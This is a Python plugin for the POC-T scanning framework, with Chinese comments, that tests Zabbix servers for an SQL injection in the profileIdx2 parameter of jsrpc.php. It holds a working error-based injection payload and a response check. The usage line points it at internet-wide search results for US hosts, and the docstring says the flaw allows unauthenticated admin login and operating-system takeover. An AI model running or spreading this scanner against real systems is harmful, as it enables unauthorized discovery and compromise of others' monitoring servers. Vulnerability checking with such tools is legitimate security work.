#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
ZABBIX jsrpc.php 参数profileIdx2 insert SQL注入漏洞

zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞， 在开启guest的情况下，攻击者无需授权登陆即可登陆zabbix管理系统， 也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。

Usage:
  python POC-T.py -s zabbix-jsrpc-sqli -aZ "zabbix country:us"

Version
  v2.2.x, 3.0.0-3.0.3

"""

import requests
from lib.verify import verify

vuln = ['zabbix']


def check(ip, ports, apps):
    if verify(vuln, ports, apps):
        url = 'http://' + ip
        payload = "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
        try:
            r = requests.get(url + payload, timeout=10)
            if ('ed733b8d10be225eceba344d533586' in r.text) or ('SQL error ' in r.text):
                return 'zabbix jsrpc sqli:' + url
        except Exception as e:
            pass
